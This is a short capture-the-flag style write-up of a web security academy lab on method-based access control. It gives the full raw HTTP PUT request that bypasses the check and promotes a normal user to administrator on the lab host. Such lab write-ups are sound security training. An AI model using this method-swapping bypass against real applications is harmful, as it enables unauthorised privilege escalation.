# Lab: Method-based access control can be circumvented

## LAB DESC
```
This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
```
## SOLUTION

use `PUT` request instead of post to solve the lab.

## REQUEST BODY

```http
PUT /admin-roles HTTP/2
Host: 0abf00500464257780d7e9010018000a.web-security-academy.net
Cookie: session=zfIl70dP2b0mCGV94sxhG4bd2SW9AuiK
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0abf00500464257780d7e9010018000a.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abf00500464257780d7e9010018000a.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener&action=upgrade
```

> LAB SOLVED!
